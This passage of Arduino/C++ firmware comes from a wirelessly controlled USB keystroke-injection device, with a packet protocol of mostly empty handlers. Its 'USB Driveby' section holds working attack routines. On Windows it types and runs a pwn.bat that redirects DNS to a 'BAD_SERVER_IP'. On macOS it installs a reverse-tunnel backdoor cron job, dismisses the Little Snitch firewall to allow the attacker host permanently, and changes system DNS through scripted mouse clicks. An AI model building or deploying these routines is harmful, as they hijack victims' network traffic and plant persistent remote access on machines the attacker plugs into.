    case LEK_RECEIVER_MOUSE_MOVE:
      handlerMouseMovePacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_SET_TIME:
      handlerSetTimePacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_PACK_LINE:
      handlerPackLinePacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_PACK_SCRIPT:
      handlerPackScriptPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_SCHEDULE_SCRIPT:
      handlerScheduleScriptPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_STATUS_REQUEST:
      handlerStatusRequestPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_SET_EVENT_TRIGGER:
      handlerSetEventTriggerPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_CLEAR_LOADS:
      handlerClearLoadsPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_RESET:
      handlerResetPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_SCUTTLE:
      handlerScuttlePacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_SCHEDULE_REQUEST:
      handlerScheduleRequestPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_EXECUTE_BAKED_ROUTINE:
      handlerExecuteBakedRoutinePacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_NOP:
      handlerNopPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_USB_MUX_CTL:
      handlerUsbMuxCtlPacket(packet, absolute_packet_size);
      break;
    case LEK_RECEIVER_USB_SLAVE_POWER_CTL:
      handlerUsbSlavePowerCtlPacket(packet, absolute_packet_size);
      break;
    default:
      //Unknown packet? NACK?
      break;
  }  
}

void LEK_Protocol::handlerBeaconPacket(ImmutablePacket packet, size_t absolute_packet_size){
  uint8_t beacon_type = getUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX);
  uint8_t beacon_sequence = getUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX); 
  uint32_t beacon_salt = getUnsigned32(packet, LEK_MESSAGE_SALT_INDEX);
  uint8_t node_name_length = getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START);
  String node_name = getNodeName(packet, node_name_length, LEK_MESSAGE_PAYLOAD_START+1);
  uint8_t network_address = getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+node_name_length);
  uint32_t uptime_ticks = getUnsigned32(packet, LEK_MESSAGE_PAYLOAD_START+node_name_length+1);
  uint8_t software_version = getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+node_name_length+5);
  //uint8_t message_terminator = getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+index_offset+6, LEK_RESERVED_MESSAGE_TERMINATOR);
  //Add this to 'beacons nearby'
}

void LEK_Protocol::handlerAckPacket(ImmutablePacket packet, size_t absolute_packet_size){
  uint8_t ack_type = getUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX);
  uint8_t ack_sequence = getUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX); 
  uint32_t ack_salt = getUnsigned32(packet, LEK_MESSAGE_SALT_INDEX);
  uint8_t error_code = 0;
  if (ack_type == LEK_GATEWAY_NACK){
    error_code = getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START);
  } else {
    //Nothing to do here... Just a reserved byte in there for safe keeping.
    //getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START);
  }
  //Nothing to do here either... just the message terminator.
  //getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1, LEK_RESERVED_MESSAGE_TERMINATOR);

  //Mark the transaction that this is associated with as COMPLETE.
}

void LEK_Protocol::handlerKeyPressPacket(ImmutablePacket packet, size_t absolute_packet_size){
  //Nothing to do here... message type.
  //getUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX);    
  uint8_t key_sequence = getUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX); 
  uint32_t key_salt = getUnsigned32(packet, LEK_MESSAGE_SALT_INDEX);
  uint8_t key = getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START);
  //Nothing to do here either... just the message terminator.
  //getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1);
  k(key);
}

void LEK_Protocol::handlerModifierPressPacket(ImmutablePacket packet, size_t absolute_packet_size){
  //Nothing to do here... message type.
  //getUnsigned8(packet, LEK_MESSAGE_TYPE_INDEX);  
  uint8_t key_sequence = getUnsigned8(packet, LEK_MESSAGE_SEQUENCE_INDEX); 
  uint32_t key_salt = getUnsigned32(packet, LEK_MESSAGE_SALT_INDEX);
  uint8_t mod_key = getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START);
  uint8_t key = getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1);
  //Nothing to do here either... just the message terminator.
  //getUnsigned8(packet, LEK_MESSAGE_PAYLOAD_START+1);
  mod(mod_key, key);
}

void LEK_Protocol::handlerLinePressPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerMouseMovePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerSetTimePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerPackLinePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerPackScriptPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerPackScriptConcludePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerScheduleScriptPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerStatusRequestPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerStatusResponsePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerSetEventTriggerPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerClearLoadsPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerResetPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerScuttlePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerScheduleResponsePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerScheduleRequestPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerEventPollConfigurationResponsePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerExecuteBakedRoutinePacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerNopPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerUsbMuxCtlPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

void LEK_Protocol::handlerUsbSlavePowerCtlPacket(ImmutablePacket packet, size_t absolute_packet_size){

}

/* 
*
*
*
* Hardware Utility Functions
*
*
*
*/
void signalFaultTrap(){
    while(1){
      for (int c = 0; c < 2; c++){
        digitalWrite(LEK_HB_LED_PIN, HIGH);
        delay(50);
        digitalWrite(LEK_HB_LED_PIN, LOW);
        delay(50); 
      }
      digitalWrite(LEK_HB_LED_PIN, HIGH);
      delay(1000);
    }
}

void signalFastBlink() {
  for (int c = 0; c < 5; c++) {
    digitalWrite(LEK_LINK_LED_PIN, HIGH);
    digitalWrite(LEK_HB_LED_PIN, HIGH);
    delay(100);
    digitalWrite(LEK_LINK_LED_PIN, LOW);
    digitalWrite(LEK_HB_LED_PIN, LOW);
    delay(100);
  }
}


/* 
*
*
*
* Packet Utility Functions
*
*
*
*/
String getString(uint8_t *packet, uint8_t packet_string_length, uint8_t index){
    char packet_string[LEK_MAX_NODE_NAME] = { 0 };
    if (packet_string_length > LEK_MAX_NODE_NAME){
        return String("");
    }
    memcpy(packet_string, packet+index, packet_string_length);
    return String(packet_string);    
}

String getNodeName(uint8_t *packet, uint8_t node_name_length, uint8_t index){
    char node_name[LEK_MAX_NODE_NAME] = { 0 };
    if (node_name_length > LEK_MAX_NODE_NAME){
        return String("");
    }
    memcpy(node_name, packet+index, node_name_length);
    return String(node_name);    
}

uint8_t getUnsigned8(uint8_t *packet, uint8_t index){
   return packet[index];
}

int8_t getSigned8(uint8_t *packet, uint8_t index){
    return static_cast<int8_t>(packet[index]);
}

int16_t getSigned16(uint8_t *packet, uint8_t index){
    union u16 {
      uint8_t b[2];
      uint16_t i;
    } us;
    us.b[0] = packet[index];
    us.b[1] = packet[index+1];
    return us.i;
}

uint16_t getUnsigned16(uint8_t *packet, uint8_t index){
    union u16 {
      uint8_t b[2];
      uint16_t ui16;
    } us;
    us.b[0] = packet[index];
    us.b[1] = packet[index+1];
    return us.ui16;
}

int32_t getSigned32(uint8_t *packet, uint8_t index){
  union s32 {
    uint8_t b[4];
    int32_t i;
  } us;
  us.b[0] = packet[index];
  us.b[1] = packet[index+1];
  us.b[2] = packet[index+2];
  us.b[3] = packet[index+3];
  return us.i;
}


uint32_t getUnsigned32(uint8_t *packet, uint8_t index){
  union u32 {
    uint8_t b[4];
    uint32_t ui32;
  } us;
  us.b[0] = packet[index];
  us.b[1] = packet[index+1];
  us.b[2] = packet[index+2];
  us.b[3] = packet[index+3];
  return us.ui32;
}


uint8_t putNodeName(uint8_t packet[], uint8_t index, const char *node_name){
    /* strnlen will cap the max value at LEK_MAX_NODE_NAME, even if it's malformed... */
    uint8_t node_name_length = strnlen(node_name, LEK_MAX_NODE_NAME);
    packet[index] = node_name_length;
    for(int i = 0; i < node_name_length; i++){
      packet[index+1+i] = node_name[i]; 
    }
    return node_name_length+1;
}

uint8_t putString(uint8_t packet[], uint8_t index, const char *c_string){
    /* The capping value here is pretty arbitrary, since a string long enough would still stomp any fields that proceeded it... */
    uint8_t string_length = strnlen(c_string, LEK_MAX_PAYLOAD_SIZE-LEK_MINIMUM_MESSAGE_SIZE);
    packet[index] = string_length;
    for(int i = 0; i < string_length; i++){
      packet[index+1+i] = c_string[i]; 
    }
    return string_length+1;
}

void putSigned8(uint8_t packet[], uint8_t index, int8_t su8){
    /* This is assigned to the unsigned array, so if negative, the value will be "wrong" when read
     *  back. BUT, if the receiver of the packet is following the spec, then they should be able to
     * get the correct value back out. It's not great, but it's not terrible?
     */
    packet[index] = static_cast<uint8_t>(su8);
}

void putUnsigned8(uint8_t packet[], uint8_t index, uint8_t ui8){
    packet[index] = ui8;
}

void putSigned16(uint8_t packet[], uint8_t index, int16_t su16){
    union s16 {
      uint8_t b[2];
      int16_t i;
    } us;
    us.i = su16;
    packet[index] = us.b[0];
    packet[index+1] = us.b[1];  
}

void putUnsigned16(uint8_t packet[], uint8_t index, uint16_t ui16){
    union u16 {
      uint8_t b[2];
      uint16_t i;
    } us;
    us.i = ui16;
    packet[index] = us.b[0];
    packet[index+1] = us.b[1];  
}

void putSigned32(uint8_t packet[], uint8_t index, int32_t su32){
    union s32 {
      uint8_t b[4];
      int32_t i;
    } us;
    us.i = su32;
    packet[index] = us.b[0];
    packet[index+1] = us.b[1];
    packet[index+2] = us.b[2];
    packet[index+3] = us.b[3];    
}

void putUnsigned32(uint8_t packet[], uint8_t index, uint32_t ui32){
    union u32 {
      uint8_t b[4];
      uint32_t i;
    } us;
    us.i = ui32;
    packet[index] = us.b[0];
    packet[index+1] = us.b[1];
    packet[index+2] = us.b[2];
    packet[index+3] = us.b[3];    
}

/* 
*
*
*
* USB Driveby Functions
*
*
*
*/

/* Keyboard functions */
void k(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.releaseAll();
}

void mod(int mod, int key){
  Keyboard.press(mod);
  Keyboard.press(key);
  delay(50);
  Keyboard.releaseAll();
}

void ctrl(int key){
  mod(KEY_LEFT_CTRL, key);
}

void cmd(int key){
  mod(KEY_LEFT_GUI, key);
}

void shift(int key){
  mod(KEY_LEFT_SHIFT, key);
}

/* Test driveby functions */

void execute_test_usb_driveby_windows(){
   openappWindows("cmd");
   delay(DELAY_RATE);
   Keyboard.println("i have compromised this system.");
}

void execute_test_usb_driveby_osx(){
  openappMacOs("Terminal");
  delay(DELAY_RATE);
  Keyboard.println("i have compromised this system.");
}

// Open an application on Windows via Run
void openappWindows(String app){
  // Windows Key + R to open Run
  mod(KEY_RIGHT_GUI, 'r');
  delay(DELAY_RATE);

  // Type the App you want to open
  Keyboard.print(app);
  k(KEY_RETURN);
  delay(DELAY_RATE);
}

void execute_usb_driveby_windows(){
  openappWindows("cmd");
  Keyboard.println("cd AppData/Local/Temp");
  Keyboard.println("echo.>pwn.bat");
  Keyboard.println("notepad pwn.bat");
  
  delay(DELAY_RATE);
  Keyboard.println("@ECHO OFF");
  Keyboard.print("set DNS=");
  Keyboard.println(BAD_SERVER_IP);
  Keyboard.println("for /f \"tokens=1,2,3*\" %%i in ('netsh int show interface') do (");
  Keyboard.println("    if %%i equ Enabled (");
  Keyboard.println("        netsh int ipv4 set dns name=\"%%l\" static %DNS1% primary validate=no");
  Keyboard.println("    )");
  Keyboard.println(")");
  Keyboard.println("ipconfig /flushdns"); // Flush DNS is optional
  mod(KEY_RIGHT_ALT, KEY_F4);
  delay(DELAY_RATE/5);
  k(KEY_RETURN);
  delay(DELAY_RATE);

  Keyboard.println("pwn.bat");
  delay(DELAY_RATE);
  Keyboard.println("del pwn.bat");

  mod(KEY_RIGHT_ALT, ' ');
  delay(DELAY_RATE/10);
  k('c');
}

void executeUsbDriveByOsX(){
  // open spotlight (or alfred/qs), then System Preferences<return>
  openappMacOs("System Preferences");

  // now open Terminal
  openappMacOs("Terminal");

  // open new terminal window
  cmd('n');

  // if the little snitch firewall is
  // installed, let's permanently add our
  // remote host so they never get asked to
  // allow the connection since little
  // snitch allows the keyboard to control it
  //
  // if there is no little snitch, we perform
  // keystrokes that, in Terminal, will
  // cause no issues.
  pwnLittleSnitch(false);

  // add our reverse tunneling backdoor to
  // cron to run every 5 minutes
   typeln(SHELLBACK_CRONJOB);

  // Now move the System Preferences window where we want it, top left corner
  typeln(APPLESCRIPT_MOVE_SYSTEM_PREFERENCES);
  // tell application "System Events" to set
  // bounds of window "System Preferences"
  // of application "System Preferences"
  // to {0, 0, 700, 700}

  // CMD+Tab back into System Preferences
  cmd(KEY_TAB);

  // CMD+F to go into System Preferences search box
  cmd('f');

  // Type in DNS Servers<return>
  typeln("DNS Servers");

  // may take a while
  delay(3000);

  // Key down in DNS servers, enter to change, and type in IP
  k(KEY_DOWN_ARROW);
  typeln("");
  typeln(BAD_SERVER_IP);

  Mouse.begin();
  
  // Move to top left of screen
  for (int i = 0; i < 1000; i++)
  {
    Mouse.move(-10, -10);
    delay(1);
  }

  // If we have hot corners enabled, move out and move back in
  for (int i = 0; i < 100; i++)
  {
    Mouse.move(1, 1);
    delay(5);
  }
  delay(DELAY_RATE);

  for (int i = 0; i < 100; i++)
  {
    Mouse.move(-1, -1);
    delay(5);
  }
  delay(DELAY_RATE);

  // move to "OK" button
  Mouse.move(100, 100);
  Mouse.move(100, 100);
  Mouse.move(100, 100);
  Mouse.move(100, 100);
  Mouse.move(100, 100);
  Mouse.move(70, 10);


  // Move to 580,540 (ok button)
  for (int i = 0; i < 54*5; i++)
  {
    //  Mouse.move(1, 1);
    delay(10);
  }

  delay(DELAY_RATE*2);

  // Click OK in DNS window
  Mouse.click();
  delay(DELAY_RATE);

  // Click Apply in Network window
  Mouse.move(0, 20);
  delay(DELAY_RATE*2);
  Mouse.click();

  // Quit System Preferences/Network
  cmd('q');
  // CMD+Tab back into Terminal
//  cmd(KEY_TAB);

  delay(DELAY_RATE*2);

  // then close the terminal window
  typeln("");
  typeln("exit");

  // exit terminal (if nothing is running)
  cmd('q');

  // in case another window is running in terminal,
  // don't quit terminal in popup window by hitting ESC
  k(KEY_ESC);
}

// type a string (pressing enter at the end)
// we have extra delays so we can see what's happening
void typeln(String chars){
  Keyboard.print(chars);
  delay(DELAY_RATE);
  Keyboard.println("");
  delay(DELAY_RATE * 4);
}

// open an application on OS X via spotlight/alfred
void openappMacOs(String app){
  // open spotlight (or alfred/qs), then the app
  cmd(' ');
  typeln(app);
  k(KEY_RETURN);
}

void clickOutOfLittleSnitch(){
  // Move to top left of screen
   for (int i = 0; i < 1000; i++)
  {
    Mouse.move(-10, -10);
    delay(1);
  }

  // If we have hot corners enabled, move out and move back in
  for (int i = 0; i < 100; i++)
  {
    Mouse.move(1, 1);
    delay(5);
  }
  delay(DELAY_RATE);

  // move to Little Snitch Allow button
  Mouse.move(100, 100);
  delay(20);
  Mouse.move(100, 100);
  delay(20);
  Mouse.move(120, -70);

  delay(DELAY_RATE*2);
  Mouse.click(); // Click click!
  delay(DELAY_RATE);
}

// evade little snitch if it's installed, but don't fumble if not installed
void pwnLittleSnitch(bool _pwn_little_snitch_with_mouse){
  // connect to our reverse tunneled backdoor to
  // get little snitch to open if it's installed
  typeln(SHELLBACK_TERMINAL_COMMAND);

  // move our keyboard using the arrow keys to allow this host permanently ;)
  k(KEY_UP_ARROW);
  k(KEY_LEFT_ARROW);

  // go to beginning of line if there's no little snitch (Ctrl+A)
  // since we would still be in terminal
  ctrl('a');  // go to beginning of line (Ctrl+a)
  shift('3'); // add a # (shift+3)
  ctrl('c');  // ^C to exit line (Ctrl+c)

  if (_pwn_little_snitch_with_mouse){
    clickOutOfLittleSnitch();
  } else {
    cmd(KEY_RETURN); // submit little snitch with keyboard.
  }
  delay(DELAY_RATE);
}
